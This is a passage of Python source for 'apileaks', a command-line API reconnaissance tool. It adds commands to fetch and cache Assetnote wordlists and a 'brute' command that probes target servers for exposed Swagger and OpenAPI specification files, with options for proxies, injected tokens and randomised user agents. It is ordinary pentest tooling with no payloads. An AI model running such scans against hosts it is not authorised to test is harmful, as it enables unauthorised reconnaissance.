                )
            )
        except Exception as exc:
            click.echo(f"Replay failed for {entry['method']} {entry['url']}: {exc}", err=True)


# =============================================================================
# wordlist command group
# =============================================================================

@cli.group(name="wordlist")
def wordlist_group():
    """Manage Assetnote wordlists (download, cache, list).

    \b
    Wordlists are fetched from wordlists.assetnote.io and cached in
    ~/.cache/apileaks/wordlists/.

    \b
    Use the assetnote: prefix in --wordlist to auto-download on demand:
      apileaks dir --target https://api.example.com \\
                   --wordlist assetnote:apiroutes-210328:20000
    """


@wordlist_group.command(name="list")
@click.option("--filter", "-f", "filter_term", default=None, metavar="TERM",
              help="Filter wordlists by name/alias substring (e.g. 'apiroutes').")
@click.option("--refresh", is_flag=True, default=False,
              help="Force re-fetch of the catalogue even if recently cached.")
@click.option("--limit", type=int, default=50, show_default=True,
              help="Maximum number of entries to display (0 = unlimited).")
def wordlist_list(filter_term, refresh, limit):
    """List available Assetnote wordlists.

    \b
    Examples:
      apileaks wordlist list
      apileaks wordlist list --filter apiroutes
      apileaks wordlist list --filter aspx --limit 20
    """
    from utils.wordlist_manager import list_wordlists

    try:
        entries = list_wordlists(filter_term=filter_term, refresh=refresh,
                                 limit=limit if limit > 0 else 0)
    except Exception as exc:
        click.echo(f"Error fetching catalogue: {exc}", err=True)
        sys.exit(1)

    if not entries:
        click.echo("No wordlists matched the filter." if filter_term else "No wordlists found.")
        return

    # Header
    col_alias   = 36
    col_count   = 9
    col_size    = 10
    col_cached  = 8
    header = (
        f"{'ALIAS':<{col_alias}} {'COUNT':>{col_count}} {'SIZE':>{col_size}}"
        f"  {'CACHED':<{col_cached}}  FILENAME"
    )
    click.echo(f"\n{header}")
    click.echo("─" * 100)
    for e in entries:
        alias   = e["alias"][:col_alias - 1] if len(e["alias"]) > col_alias else e["alias"]
        count   = f"{e['count']:,}" if e["count"] else "—"
        size    = e["filesize"] or "—"
        cached  = "✓" if e["cached"] else ""
        click.echo(
            f"{alias:<{col_alias}} {count:>{col_count}} {size:>{col_size}}"
            f"  {cached:<{col_cached}}  {e['name']}"
        )
    click.echo()
    click.echo(
        "Usage: apileaks dir --target URL "
        "--wordlist assetnote:<ALIAS>  (or  assetnote:<ALIAS>:<N> for first N lines)"
    )
    click.echo()


@wordlist_group.command(name="fetch")
@click.argument("name")
@click.option("--refresh", is_flag=True, default=False,
              help="Re-download even if already cached.")
def wordlist_fetch(name, refresh):
    """Download and cache an Assetnote wordlist by alias or filename.

    NAME is the alias (e.g. apiroutes-210328) or filename
    (e.g. httparchive_apiroutes_2021_03_28.txt).

    \b
    Examples:
      apileaks wordlist fetch apiroutes-210328
      apileaks wordlist fetch raft-large-words --refresh
    """
    from utils.wordlist_manager import fetch_wordlist

    try:
        path = fetch_wordlist(name, refresh=refresh)
        click.echo(f"Wordlist ready: {path}")
    except SystemExit as exc:
        click.echo(str(exc), err=True)
        sys.exit(1)
    except Exception as exc:
        click.echo(f"Error: {exc}", err=True)
        sys.exit(1)


@wordlist_group.command(name="cache")
def wordlist_cache():
    """Show the local wordlist cache location and its contents."""
    from utils.wordlist_manager import _CACHE_ROOT

    click.echo(f"\nCache directory: {_CACHE_ROOT}")

    if not _CACHE_ROOT.exists():
        click.echo("  (empty — no wordlists downloaded yet)")
        return

    files = sorted(_CACHE_ROOT.glob("*"))
    total_bytes = 0
    shown = 0
    for f in files:
        if f.name.startswith("_catalogue_"):
            continue  # skip catalogue files
        size = f.stat().st_size
        total_bytes += size
        size_kb = size // 1024
        click.echo(f"  {size_kb:>8} KB  {f.name}")
        shown += 1

    if shown == 0:
        click.echo("  (no wordlists cached yet)")
    else:
        click.echo(f"\n  {shown} file(s), {total_bytes // 1024:,} KB total")
    click.echo()


# =============================================================================
# brute command — discover exposed API specification files
# Equivalent to `sj brute`.  Reuses _run_spec_brute / _brute_spec_async from
# the dir --brute-spec implementation so there is zero logic duplication.
# =============================================================================

@cli.command(name="brute")
@click.option('--target', '-t', 'target', required=False, default=None,
              help='Target URL to brute-force (e.g. https://api.example.com). '
                   'Required unless --target-file is supplied.')
@click.option('--target-file', 'target_file', default=None,
              type=click.Path(exists=True, readable=True),
              metavar='FILE',
              help='Plain-text file with one target URL per line (comments '
                   'starting with # and blank lines are skipped). '
                   'Scanned sequentially.')
@click.option('--wordlist', '-w', 'brute_spec_wordlist', default=None,
              type=click.Path(exists=True, readable=True),
              metavar='FILE',
              help='Custom wordlist of spec-file paths to probe (one per line). '
                   'Defaults to the built-in wordlists/spec_files.txt '
                   f'({len(_load_spec_brute_wordlist(_DEFAULT_SPEC_WORDLIST))} paths).')
@click.option('--extensions', '-e', 'brute_spec_extensions', is_flag=True, default=False,
              help='Append .json / .yaml / .yml to every wordlist entry, '
                   'tripling coverage at the cost of more requests.')
@click.option('--concurrency', '-c', 'brute_spec_concurrency', type=int, default=20,
              show_default=True, metavar='N',
              help='Maximum concurrent HTTP requests.')
@click.option('--timeout', 'timeout', type=float, default=10.0,
              show_default=True,
              help='Per-request timeout in seconds.')
@click.option('--proxy', '-p', 'proxy', default=None, metavar='URL',
              help='Route all requests through an intercepting proxy '
                   '(e.g. http://127.0.0.1:8080 for Burp/Caido).')
@click.option('--proxy-verify-ssl', 'proxy_verify_ssl', is_flag=True, default=False,
              help='Keep TLS verification enabled when using --proxy '
                   '(use after installing the proxy CA certificate).')
@click.option('--insecure', '-i', 'insecure', is_flag=True, default=False,
              help='Disable TLS certificate verification (equivalent to curl -k).')
@click.option('--jwt', 'jwt', default=None, metavar='TOKEN',
              help='Bearer token injected as Authorization: Bearer <TOKEN> on '
                   'every request.')
@click.option('--header', '-H', 'header', multiple=True, metavar='"Name: Value"',
              help='Custom request header, "Name: Value" format. Repeatable.')
@click.option('--user-agent-random', 'user_agent_random', is_flag=True, default=False,
              help='Randomise the User-Agent header on every request.')
@click.option('--user-agent-custom', 'user_agent_custom', default=None, metavar='STRING',
              help='Use a fixed custom User-Agent string.')
@click.option('--output', '-o', 'brute_spec_output', default=None,
              type=click.Path(), metavar='FILE',
              help='Write results to a JSON file.')
@click.option('--quiet', '-q', 'quiet', is_flag=True, default=False,
              help='Suppress per-request output; only print the final summary.')
@click.pass_context
def brute_cmd(ctx, target, target_file, brute_spec_wordlist, brute_spec_extensions,
              brute_spec_concurrency, timeout, proxy, proxy_verify_ssl, insecure,
              jwt, header, user_agent_random, user_agent_custom,
              brute_spec_output, quiet):
    """Brute-force exposed API specification files on a target server.

    Sends requests to hundreds of well-known paths where Swagger, OpenAPI,
    RAML, AsyncAPI, and other API definition files are commonly exposed.
    Reports every hit with a ✓/⚠ indicator and flags confirmed spec files.

    Equivalent to `sj brute -u TARGET`.

    \b
    Examples:
      # Quick scan — use built-in wordlist (247 paths)
      python apileaks.py brute --target https://api.example.com

      # Route through Burp Suite
      python apileaks.py brute -t https://api.example.com -p http://127.0.0.1:8080

      # Expand coverage with extension variants (.json/.yaml/.yml)
      python apileaks.py brute -t https://api.example.com -e

      # Custom wordlist + save JSON results
      python apileaks.py brute -t https://api.example.com \\
          -w my_spec_paths.txt --output results.json

      # Scan a list of targets quietly
      python apileaks.py brute --target-file hosts.txt -q --output results.json

      # Authenticate with a JWT
      python apileaks.py brute -t https://api.example.com --jwt eyJ...

      # Quiet mode for CI/scripting (no per-request noise)
      python apileaks.py brute -t https://api.example.com -q
    """
    no_banner = ctx.obj.get("no_banner", False) if ctx.obj else False
    if not no_banner:
        print_banner()

    # ── Resolve target list ───────────────────────────────────────────────────
    targets = []
    if target_file:
        try:
            targets = parse_target_file(target_file)
        except click.BadParameter as exc:
            click.echo(f"Error: {exc}", err=True)
            sys.exit(1)
        if not targets:
            click.echo(f"Error: --target-file '{target_file}' contains no valid targets.", err=True)
            sys.exit(1)
    if target:
        # Prepend explicit --target; deduplicate preserving order.
        if target not in targets:
            targets.insert(0, target)
    if not targets:
        click.echo(
            "Error: Either --target or --target-file must be supplied.\n"
            "  --target URL           scan a single host\n"
            "  --target-file FILE     scan every host listed in FILE",
            err=True,
        )
        sys.exit(1)

    # ── TLS verification: --insecure wins; --proxy disables by default ────────
    verify_ssl = not insecure and (not proxy or proxy_verify_ssl)

    # ── Run brute-force for each target ───────────────────────────────────────
    all_spec_hits = []
    logger = get_logger("brute")

    for t in targets:
        hits, spec_hits = _run_spec_brute(
            t,
            brute_spec_wordlist=brute_spec_wordlist,
            brute_spec_extensions=brute_spec_extensions,
            proxy=proxy,
            timeout=timeout,
            concurrency=brute_spec_concurrency,
            verify_ssl=verify_ssl,
            jwt=jwt,
            header=header,
            user_agent_random=user_agent_random,
            user_agent_custom=user_agent_custom,
            # Per-target output only when a single target is scanned; for
            # multi-target runs the consolidated output goes to brute_spec_output.
            output_file=brute_spec_output if len(targets) == 1 else None,
            quiet=quiet,
            logger=logger,
        )
        all_spec_hits.extend(spec_hits)

    # ── Multi-target consolidated output ─────────────────────────────────────
    if len(targets) > 1:
        click.echo(f"\n{'═' * 60}")
        click.echo(f"🏁 Brute-Scan complete — {len(targets)} targets")
        click.echo(
            click.style(
                f"   Total spec files found: {len(all_spec_hits)}",
                fg="green" if all_spec_hits else "white",
                bold=bool(all_spec_hits),
            )
        )
        if all_spec_hits:
            for hit in all_spec_hits:
                click.echo(click.style(f"   → {hit['url']}", fg="green"))

        if brute_spec_output:
            import json as _json
            payload = {
                "targets": targets,
                "total_spec_hits": len(all_spec_hits),
                "spec_hits": all_spec_hits,
            }
            os.makedirs(os.path.dirname(os.path.abspath(brute_spec_output)) or ".", exist_ok=True)
            with open(brute_spec_output, "w", encoding="utf-8") as fh:
                _json.dump(payload, fh, indent=2)
            click.echo(f"\n💾 Consolidated results saved: {brute_spec_output}")


if __name__ == '__main__':
    cli()
